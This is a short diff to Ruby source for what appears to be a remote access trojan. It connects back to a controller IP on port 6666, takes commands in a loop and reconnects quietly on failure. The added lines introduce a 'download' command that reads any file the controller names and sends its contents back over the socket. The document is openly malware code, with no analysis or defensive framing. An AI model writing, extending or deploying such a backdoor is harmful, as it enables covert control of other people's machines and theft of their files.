@@ -5,7 +5,7 @@ def rat(ip)
   begin
     socket = TCPSocket.new(ip, 6666)
     loop do
-      command = socket.gets.chomp
+      command, file = socket.gets.chomp.split(' ')
       case command
       when 'session'
         loop do
@@ -20,12 +20,21 @@ def rat(ip)
           end
           socket.puts 'done'
         end
+      when 'download'
+        file = File.open(file, 'r')
+        content = file.read
+        puts content
+        socket.puts content
+        file.close
+        socket.puts 'done'
       end
     end
 
   rescue SocketError, Errno::ECONNREFUSED, Errno::ECONNRESET
     sleep 2
     retry
+  rescue Interrupt
+    socket.close
   end
 
 end
